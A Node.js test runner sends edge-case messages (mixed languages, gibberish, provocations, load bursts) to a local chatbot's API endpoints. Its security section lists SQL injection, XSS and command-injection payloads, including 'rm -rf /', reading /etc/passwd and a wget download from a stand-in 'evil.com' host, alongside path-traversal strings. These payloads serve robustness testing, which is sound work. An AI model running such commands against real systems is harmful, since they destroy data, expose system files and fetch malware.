#!/usr/bin/env node

// Comprehensive Chat Endpoint Test Runner
// This script runs all extreme edge case tests without Jest dependencies

const { performance } = require('perf_hooks');

// Configuration
const TEST_CONFIG = {
  API_BASE_URL: process.env.TEST_API_URL || 'http://localhost:3000',
  TIMEOUT: 30000,
  MAX_RETRIES: 3,
  CONCURRENT_LIMIT: 50,
  
  ENDPOINTS: {
    CHAT: '/api/ai/chat',
    CHAT_LLM: '/api/ai/chat-with-llm',
    CHAT_STREAMING: '/api/ai/chat-streaming',
    INTELLIGENT_CHAT: '/api/ai/intelligent-chat',
    TEST_CHAT: '/api/test-chat',
  },
  
  EXTREME_LANGUAGE_CASES: [
    // Mixed languages
    "Hello, jakie masz umiejętności in English?",
    "Привет, tell me about projektach на русском",
    "Hola, ¿qué projekty tienes en español?",
    "Bonjour, quelles sont vos compétences?",
    
    // Dialects and slang
    "Yo, co tam z tymi skillsami bracie?",
    "Ey koleś, gadaj co robisz",
    "Siema ziomek, jakie masz doświadczenie?",
    "Sup dude, what can you do?",
    
    // Special characters and emojis
    "🚀 Jakie masz umiejętności? 🎯",
    "💻 Tell me about your skills 🔥",
    "⚡ Co potrafisz zrobić? ⭐",
    
    // Case variations
    "JAKIE MASZ UMIEJĘTNOŚCI???",
    "what skills do you have",
    "WhaT ProJectS dO YoU HaVe?",
    
    // Accented characters
    "Jakie masz ûmîęjętnöści???",
    "What @#$% skills do you have?",
    "Co rob!sz w pr@cy?",
  ],

  EXTREME_TECHNICAL_CASES: [
    // Very long queries
    "A".repeat(1000) + " jakie masz umiejętności?",
    "B".repeat(5000) + " tell me about your projects",
    
    // Very short queries
    "?",
    "a",
    "co",
    "hi",
    "yo",
    ".",
    "!",
    
    // Special characters only
    "!@#$%^&*()",
    "😀😃😄😁😆😊😇😍",
    "🔥💻⚡🎯🚀💡🎨🖼️",
    
    // Code as questions
    "console.log('jakie masz umiejętności')",
    "SELECT * FROM skills WHERE user='eryk'",
    "import { skills } from './eryk'",
    
    // Data formats
    '{"question": "jakie masz umiejętności"}',
    "<question>Co potrafisz?</question>",
    "skills: [design, programming, leadership]",
    
    // Escape characters
    "Jakie masz\\numiejętności\\t?",
    "What\\rskills\\ndo\\tyou\\rhave?",
    
    // Null/undefined/boolean
    "null",
    "undefined",
    "true",
    "false",
    "NaN",
    "Infinity",
    
    // Numbers and dates
    "12345678901234567890",
    "0",
    "-1",
    "3.14159",
    "2023-01-01T00:00:00Z",
    
    // URLs and paths
    "https://example.com/skills",
    "file:///etc/passwd",
    "/api/ai/chat",
    "../../etc/passwd",
  ],

  EXTREME_CONTEXT_CASES: [
    // No context questions
    "Dlaczego?",
    "Jak?",
    "Kiedy?",
    "Gdzie?",
    "Co z tym?",
    "Why?",
    "How?",
    "When?",
    "Where?",
    "What about it?",
    
    // Ambiguous questions
    "To jest dobre?",
    "Czy to działa?",
    "Ile to kosztuje?",
    "Is this good?",
    "Does it work?",
    "How much does it cost?",
    
    // Philosophical questions
    "Jaki jest sens życia?",
    "Czy sztuczna inteligencja ma duszę?",
    "Co to znaczy być człowiekiem?",
    "What is the meaning of life?",
    "Do AIs have souls?",
    "What does it mean to be human?",
    
    // Personal questions
    "Ile zarabiasz?",
    "Masz dziewczynę?",
    "Gdzie mieszkasz?",
    "How much do you make?",
    "Do you have a girlfriend?",
    "Where do you live?",
    
    // Provocative questions
    "Jesteś głupi?",
    "Nie wierzę ci",
    "To nieprawda",
    "Are you stupid?",
    "I don't believe you",
    "That's not true",
    
    // Meta questions
    "Czym jesteś?",
    "Jak działasz?",
    "Kto cię stworzył?",
    "What are you?",
    "How do you work?",
    "Who created you?",
  ],

  EXTREME_CHAOS_CASES: [
    // Spam/repetitions
    "jakie jakie jakie jakie masz umiejętności?",
    "skills skills skills skills skills",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAA",
    "hahahahahahahahahahahahaha",
    "lol lol lol lol lol lol lol",
    
    // Random words
    "banana komputer słoń javascript",
    "random words elephant programming",
    "kot pies samochód reaktor",
    "pizza unicorn rainbow database",
    "cheese mountain flying spaghetti",
    
    // Gibberish
    "asdfghjkl qwertyuiop zxcvbnm",
    "fjdklsajf kldsajflkdsaj flkdsajf",
    "blahblahblah yaddayadda hoohah",
    "fumblerooski whatzitcalled thingamajig",
    "ksjdhfkjshdf kjshdfkjshd",
    
    // Boolean chaos
    "true false true false true",
    "yes no maybe so perhaps",
    "tak nie może być definitely",
    
    // Number sequences
    "1 2 3 4 5 6 7 8 9 10",
    "0 1 1 2 3 5 8 13 21 34", // Fibonacci
    "2 4 6 8 10 12 14 16 18",
    
    // Multiple questions
    "Who? What? When? Where? Why? How?",
    "Co? Jak? Kiedy? Gdzie? Dlaczego?",
    
    // Contradictory statements
    "You are great and terrible",
    "I love you and hate you",
    "This is true and false",
    "Yes and no simultaneously",
    "Maybe definitely perhaps",
    "Absolutely not sure",
  ],

  SECURITY_PARAMS: {
    SQL_INJECTIONS: [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "'; SELECT * FROM secrets; --",
      "UNION SELECT password FROM users",
      "' OR 1=1 --",
    ],
    
    XSS_ATTACKS: [
      "<script>alert('xss')</script>",
      "javascript:alert('xss')",
      "<img src=x onerror=alert('xss')>",
      "';alert('xss');//",
      "<svg onload=alert('xss')>",
    ],
    
    COMMAND_INJECTIONS: [
      "; cat /etc/passwd",
      "| ls -la",
      "&& rm -rf /",
      "; wget evil.com/malware",
      "` cat /etc/passwd `",
    ],
  },

  PERFORMANCE_PARAMS: {
    LIGHT_LOAD: 10,
    MEDIUM_LOAD: 50,
    HEAVY_LOAD: 100,
    EXTREME_LOAD: 200,
    
    TIMEOUT_SHORT: 5000,
    TIMEOUT_MEDIUM: 15000,
    TIMEOUT_LONG: 30000,
    
    ACCEPTABLE_RESPONSE_TIME: 5000,
    ACCEPTABLE_FAILURE_RATE: 0.05, // 5%
    
    MEMORY_LEAK_THRESHOLD: 100 * 1024 * 1024, // 100MB
  },
};

// Test Results Storage
let testResults = [];
let overallStats = {
  totalTests: 0,
  passedTests: 0,
  failedTests: 0,
  totalTime: 0,
  errors: [],
};

// Utility Functions
function log(message, level = 'info') {
  const timestamp = new Date().toISOString();
  const prefix = {
    info: '📋',
    success: '✅',
    error: '❌',
    warning: '⚠️',
    debug: '🔍'
  }[level] || '📋';
  
  console.log(`${prefix} [${timestamp}] ${message}`);
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// HTTP Request Function
async function makeRequest(endpoint, body, options = {}) {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), options.timeout || TEST_CONFIG.TIMEOUT);
  
  try {
    const response = await fetch(`${TEST_CONFIG.API_BASE_URL}${endpoint}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(body),
      signal: controller.signal
    });
    
    clearTimeout(timeoutId);
    
    const responseBody = await response.json();
    
    return {
      status: response.status,
      body: responseBody,
      ok: response.ok
    };
    
  } catch (error) {
    clearTimeout(timeoutId);
    throw error;
  }
}

// Test Validation Function
function validateResponse(response, testCase, endpoint) {
  const validations = [
    // Basic HTTP response validation
    {
      check: () => response.status === 200,
      message: `HTTP status should be 200, got ${response.status}`
    },
    
    // Response body validation
    {
      check: () => response.body && typeof response.body === 'object',
      message: 'Response body should be a valid object'
    },
    
    // Content validation
    {
      check: () => response.body.content && typeof response.body.content === 'string',
      message: 'Response should contain valid content string'
    },
    
    // Content length validation
    {
      check: () => response.body.content.length > 0,
      message: 'Response content should not be empty'
    },
    
    // Reasonable content length
    {
      check: () => response.body.content.length < 10000,
      message: 'Response content should be reasonable length (< 10k chars)'
    },
    
    // Should not contain error indicators
    {
      check: () => !response.body.content.toLowerCase().includes('error'),
      message: 'Response should not contain error messages'
    },
    
    // Should not contain undefined/null text
    {
      check: () => 
        !response.body.content.includes('undefined') && 
        !response.body.content.includes('null'),
      message: 'Response should not contain undefined/null text'
    },
    
    // Should not be generic fallback for normal queries
    {
      check: () => {
        const isNormalQuery = testCase.length > 2 && (
          testCase.includes('umiejętności') || 
          testCase.includes('skills') || 
          testCase.includes('projekty') || 
          testCase.includes('projects')
        );
        
        const isGenericFallback = response.body.content.includes('nie zrozumiałem pytania');
        
        return !isNormalQuery || !isGenericFallback;
      },
      message: 'Normal queries should not trigger generic fallback responses'
    },
    
    // Language detection validation
    {
      check: () => {
        const isPolish = /[ąćęłńóśźżĄĆĘŁŃÓŚŹŻ]/.test(testCase);
        const responseInPolish = /[ąćęłńóśźżĄĆĘŁŃÓŚŹŻ]/.test(response.body.content);
        
        // If input is Polish, response should generally be Polish too
        return !isPolish || responseInPolish;
      },
      message: 'Response language should match input language'
    }
  ];

  for (const validation of validations) {
    try {
      if (!validation.check()) {
        return { isValid: false, message: validation.message };
      }
    } catch (error) {
      return { 
        isValid: false, 
        message: `Validation error: ${error.message}`
      };
    }
  }

  return { isValid: true, message: 'All validations passed' };
}

// Individual Test Function
async function runSingleTest(endpoint, testCase, category) {
  const startTime = performance.now();
  
  try {
    const response = await makeRequest(endpoint, {
      messages: [{ role: 'user', content: testCase }],
      sessionId: `test-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`
    });

    const responseTime = performance.now() - startTime;
    
    // Validate response
    const validationResult = validateResponse(response, testCase, endpoint);
    
    const result = {
      endpoint,
      testCase: testCase.length > 100 ? testCase.substring(0, 100) + '...' : testCase,
      category,
      passed: validationResult.isValid,
      message: validationResult.message,
      responseTime: Math.round(responseTime),
      timestamp: new Date().toISOString(),
      response: response.body
    };
    
    testResults.push(result);
    overallStats.totalTests++;
    
    if (result.passed) {
      overallStats.passedTests++;
      log(`✅ ${endpoint} - ${category} - ${result.responseTime}ms`, 'success');
    } else {
      overallStats.failedTests++;
      overallStats.errors.push({
        endpoint,
        testCase: result.testCase,
        error: result.message,
        timestamp: result.timestamp
      });
      log(`❌ ${endpoint} - ${category} - ${result.message}`, 'error');
    }
    
    return result;
    
  } catch (error) {
    const responseTime = performance.now() - startTime;
    const result = {
      endpoint,
      testCase: testCase.length > 100 ? testCase.substring(0, 100) + '...' : testCase,
      category,
      passed: false,
      message: `Request failed: ${error.message}`,
      responseTime: Math.round(responseTime),
      timestamp: new Date().toISOString(),
      error: error.message
    };
    
    testResults.push(result);
    overallStats.totalTests++;
    overallStats.failedTests++;
    overallStats.errors.push({
      endpoint,
      testCase: result.testCase,
      error: error.message,
      timestamp: result.timestamp
    });
    
    log(`❌ ${endpoint} - ${category} - ${error.message}`, 'error');
    return result;
  }
}

// Test Suite Functions
async function runHealthCheck() {
  log('🏥 Running Health Check...', 'info');
  
  const healthResults = [];
  
  for (const [name, endpoint] of Object.entries(TEST_CONFIG.ENDPOINTS)) {
    const result = await runSingleTest(endpoint, 'jakie masz umiejętności', 'health-check');
    healthResults.push({ name, ...result });
  }
  
  const healthyEndpoints = healthResults.filter(r => r.passed).length;
  log(`🏥 Health Check Complete: ${healthyEndpoints}/${healthResults.length} endpoints healthy`, 'info');
  
  return healthResults;
}

async function runLanguageTests() {
  log('🎭 Running Extreme Language Tests...', 'info');
  
  const languageResults = [];
  
  for (const [name, endpoint] of Object.entries(TEST_CONFIG.ENDPOINTS)) {
    log(`Testing ${name} with ${TEST_CONFIG.EXTREME_LANGUAGE_CASES.length} language cases...`, 'info');
    
    for (const testCase of TEST_CONFIG.EXTREME_LANGUAGE_CASES) {
      const result = await runSingleTest(endpoint, testCase, 'extreme-language');
      languageResults.push({ endpoint: name, ...result });
      await sleep(50); // Small delay between tests
    }
  }
  
  const passRate = languageResults.filter(r => r.passed).length / languageResults.length;
  log(`🎭 Language Tests Complete: ${(passRate * 100).toFixed(1)}% pass rate`, 'info');
  
  return languageResults;
}

async function runTechnicalTests() {
  log('🤖 Running Extreme Technical Tests...', 'info');
  
  const technicalResults = [];
  
  for (const [name, endpoint] of Object.entries(TEST_CONFIG.ENDPOINTS)) {
    log(`Testing ${name} with ${TEST_CONFIG.EXTREME_TECHNICAL_CASES.length} technical cases...`, 'info');
    
    for (const testCase of TEST_CONFIG.EXTREME_TECHNICAL_CASES) {
      const result = await runSingleTest(endpoint, testCase, 'extreme-technical');
      technicalResults.push({ endpoint: name, ...result });
      await sleep(50); // Small delay between tests
    }
  }
  
  const passRate = technicalResults.filter(r => r.passed).length / technicalResults.length;
  log(`🤖 Technical Tests Complete: ${(passRate * 100).toFixed(1)}% pass rate`, 'info');
  
  return technicalResults;
}

async function runContextTests() {
  log('🎪 Running Extreme Context Tests...', 'info');
  
  const contextResults = [];
  
  for (const [name, endpoint] of Object.entries(TEST_CONFIG.ENDPOINTS)) {
    log(`Testing ${name} with ${TEST_CONFIG.EXTREME_CONTEXT_CASES.length} context cases...`, 'info');
    
    for (const testCase of TEST_CONFIG.EXTREME_CONTEXT_CASES) {
      const result = await runSingleTest(endpoint, testCase, 'extreme-context');
      contextResults.push({ endpoint: name, ...result });
      await sleep(50); // Small delay between tests
    }
  }
  
  const passRate = contextResults.filter(r => r.passed).length / contextResults.length;
  log(`🎪 Context Tests Complete: ${(passRate * 100).toFixed(1)}% pass rate`, 'info');
  
  return contextResults;
}

async function runChaosTests() {
  log('🌪️ Running Extreme Chaos Tests...', 'info');
  
  const chaosResults = [];
  
  for (const [name, endpoint] of Object.entries(TEST_CONFIG.ENDPOINTS)) {
    log(`Testing ${name} with ${TEST_CONFIG.EXTREME_CHAOS_CASES.length} chaos cases...`, 'info');
    
    for (const testCase of TEST_CONFIG.EXTREME_CHAOS_CASES) {
      const result = await runSingleTest(endpoint, testCase, 'extreme-chaos');
      chaosResults.push({ endpoint: name, ...result });
      await sleep(50); // Small delay between tests
    }
  }
  
  const passRate = chaosResults.filter(r => r.passed).length / chaosResults.length;
  log(`🌪️ Chaos Tests Complete: ${(passRate * 100).toFixed(1)}% pass rate`, 'info');
  
  return chaosResults;
}

async function runSecurityTests() {
  log('🔐 Running Security Tests...', 'info');
  
  const securityResults = [];
  
  for (const [name, endpoint] of Object.entries(TEST_CONFIG.ENDPOINTS)) {
    log(`Testing ${name} security...`, 'info');
    
    // Test SQL Injections
    for (const injection of TEST_CONFIG.SECURITY_PARAMS.SQL_INJECTIONS) {
      const result = await runSingleTest(endpoint, injection, 'sql-injection');
      securityResults.push({ endpoint: name, attackType: 'sql', ...result });
      await sleep(100); // Longer delay for security tests
    }
    
    // Test XSS Attacks
    for (const xss of TEST_CONFIG.SECURITY_PARAMS.XSS_ATTACKS) {
      const result = await runSingleTest(endpoint, xss, 'xss-attack');
      securityResults.push({ endpoint: name, attackType: 'xss', ...result });
      await sleep(100);
    }
    
    // Test Command Injections
    for (const cmd of TEST_CONFIG.SECURITY_PARAMS.COMMAND_INJECTIONS) {
      const result = await runSingleTest(endpoint, cmd, 'command-injection');
      securityResults.push({ endpoint: name, attackType: 'command', ...result });
      await sleep(100);
    }
  }
  
  const vulnerabilities = securityResults.filter(r => !r.passed).length;
  log(`🔐 Security Tests Complete: ${vulnerabilities} potential vulnerabilities found`, 'info');
  
  return securityResults;
}

async function runPerformanceTests() {
  log('⚡ Running Performance Tests...', 'info');
  
  const performanceResults = [];
  
  for (const [name, endpoint] of Object.entries(TEST_CONFIG.ENDPOINTS)) {
    log(`Testing ${name} performance...`, 'info');
    
    // Test concurrent requests
    const concurrentResults = [];
    const startTime = performance.now();
    
    const promises = Array.from({ length: TEST_CONFIG.PERFORMANCE_PARAMS.LIGHT_LOAD }, (_, i) => 
      makeRequest(endpoint, {
        messages: [{ role: 'user', content: `Performance test ${i + 1}` }],
        sessionId: `perf-test-${Date.now()}-${i}`
      })
    );
    
    try {
      const results = await Promise.allSettled(promises);
      const totalTime = performance.now() - startTime;
      
      const successful = results.filter(r => r.status === 'fulfilled').length;
      const failed = results.filter(r => r.status === 'rejected').length;
      
      const performanceResult = {
        endpoint: name,
        category: 'performance',
        totalRequests: TEST_CONFIG.PERFORMANCE_PARAMS.LIGHT_LOAD,
        successful,
        failed,
        totalTime: Math.round(totalTime),
        averageTime: Math.round(totalTime / TEST_CONFIG.PERFORMANCE_PARAMS.LIGHT_LOAD),
        successRate: (successful / TEST_CONFIG.PERFORMANCE_PARAMS.LIGHT_LOAD) * 100,
        passed: successful >= TEST_CONFIG.PERFORMANCE_PARAMS.LIGHT_LOAD * 0.9, // 90% success rate
        timestamp: new Date().toISOString()
      };
      
      performanceResults.push(performanceResult);
      
      if (performanceResult.passed) {
        log(`✅ ${name} Performance: ${performanceResult.successRate.toFixed(1)}% success, ${performanceResult.averageTime}ms avg`, 'success');
      } else {
        log(`❌ ${name} Performance: ${performanceResult.successRate.toFixed(1)}% success, ${performanceResult.averageTime}ms avg`, 'error');
      }
      
    } catch (error) {
      log(`❌ ${name} Performance test failed: ${error.message}`, 'error');
    }
  }
  
  log(`⚡ Performance Tests Complete`, 'info');
  return performanceResults;
}

// Report Generation
function generateReport() {
  const report = {
    summary: {
      totalTests: overallStats.totalTests,
      passedTests: overallStats.passedTests,
      failedTests: overallStats.failedTests,
      successRate: overallStats.totalTests > 0 ? (overallStats.passedTests / overallStats.totalTests) * 100 : 0,
      totalTime: overallStats.totalTime,
      timestamp: new Date().toISOString()
    },
    
    testsByCategory: {},
    testsByEndpoint: {},
    
    recentFailures: overallStats.errors.slice(-10),
    
    recommendations: []
  };
  
  // Group by category
  const categories = [...new Set(testResults.map(r => r.category))];
  categories.forEach(category => {
    const categoryTests = testResults.filter(r => r.category === category);
    report.testsByCategory[category] = {
      total: categoryTests.length,
      passed: categoryTests.filter(r => r.passed).length,
      failed: categoryTests.filter(r => !r.passed).length,
      successRate: (categoryTests.filter(r => r.passed).length / categoryTests.length) * 100
    };
  });
  
  // Group by endpoint
  const endpoints = [...new Set(testResults.map(r => r.endpoint))];
  endpoints.forEach(endpoint => {
    const endpointTests = testResults.filter(r => r.endpoint === endpoint);
    report.testsByEndpoint[endpoint] = {
      total: endpointTests.length,
      passed: endpointTests.filter(r => r.passed).length,
      failed: endpointTests.filter(r => !r.passed).length,
      successRate: (endpointTests.filter(r => r.passed).length / endpointTests.length) * 100
    };
  });
  
  // Generate recommendations
  if (report.summary.successRate < 90) {
    report.recommendations.push('Overall success rate is below 90%. Consider investigating common failure patterns.');
  }
  
  if (overallStats.errors.length > 0) {
    const commonErrors = {};
    overallStats.errors.forEach(error => {
      commonErrors[error.error] = (commonErrors[error.error] || 0) + 1;
    });
    
    const mostCommonError = Object.entries(commonErrors).sort(([,a], [,b]) => b - a)[0];
    if (mostCommonError) {
      report.recommendations.push(`Most common error: "${mostCommonError[0]}" (${mostCommonError[1]} occurrences)`);
    }
  }
  
  return report;
}

// Main Test Runner
async function runAllTests() {
  const testStartTime = performance.now();
  
  log('🚀 Starting Comprehensive Chat Endpoint Testing...', 'info');
  log(`📡 Testing against: ${TEST_CONFIG.API_BASE_URL}`, 'info');
  log(`🎯 Endpoints: ${Object.keys(TEST_CONFIG.ENDPOINTS).join(', ')}`, 'info');
  
  try {
    // Run all test suites
    await runHealthCheck();
    await runLanguageTests();
    await runTechnicalTests();
    await runContextTests();
    await runChaosTests();
    await runSecurityTests();
    await runPerformanceTests();
    
    // Generate final report
    overallStats.totalTime = performance.now() - testStartTime;
    const report = generateReport();
    
    // Display results
    log('='.repeat(80), 'info');
    log('📊 COMPREHENSIVE TEST RESULTS', 'info');
    log('='.repeat(80), 'info');
    log(`✅ Total Tests: ${report.summary.totalTests}`, 'info');
    log(`🎯 Passed: ${report.summary.passedTests}`, 'info');
    log(`❌ Failed: ${report.summary.failedTests}`, 'info');
    log(`📈 Success Rate: ${report.summary.successRate.toFixed(2)}%`, 'info');
    log(`⏱️ Total Time: ${Math.round(report.summary.totalTime)}ms`, 'info');
    log('='.repeat(80), 'info');
    
    // Category breakdown
    log('📋 Results by Category:', 'info');
    Object.entries(report.testsByCategory).forEach(([category, stats]) => {
      log(`  ${category}: ${stats.passed}/${stats.total} (${stats.successRate.toFixed(1)}%)`, 'info');
    });
    
    // Endpoint breakdown
    log('📡 Results by Endpoint:', 'info');
    Object.entries(report.testsByEndpoint).forEach(([endpoint, stats]) => {
      log(`  ${endpoint}: ${stats.passed}/${stats.total} (${stats.successRate.toFixed(1)}%)`, 'info');
    });
    
    // Recent failures
    if (report.recentFailures.length > 0) {
      log('🚨 Recent Failures:', 'warning');
      report.recentFailures.forEach((failure, index) => {
        log(`  ${index + 1}. ${failure.endpoint}: ${failure.testCase} - ${failure.error}`, 'warning');
      });
    }
    
    // Recommendations
    if (report.recommendations.length > 0) {
      log('💡 Recommendations:', 'info');
      report.recommendations.forEach((rec, index) => {
        log(`  ${index + 1}. ${rec}`, 'info');
      });
    }
    
    log('='.repeat(80), 'info');
    log('🏁 Comprehensive testing completed!', 'success');
    
    // Exit with appropriate code
    process.exit(report.summary.successRate >= 80 ? 0 : 1);
    
  } catch (error) {
    log(`💥 Test suite failed: ${error.message}`, 'error');
    console.error(error);
    process.exit(1);
  }
}

// Check if running as main module
if (require.main === module) {
  runAllTests();
}

module.exports = {
  runAllTests,
  TEST_CONFIG,
  runSingleTest,
  validateResponse
};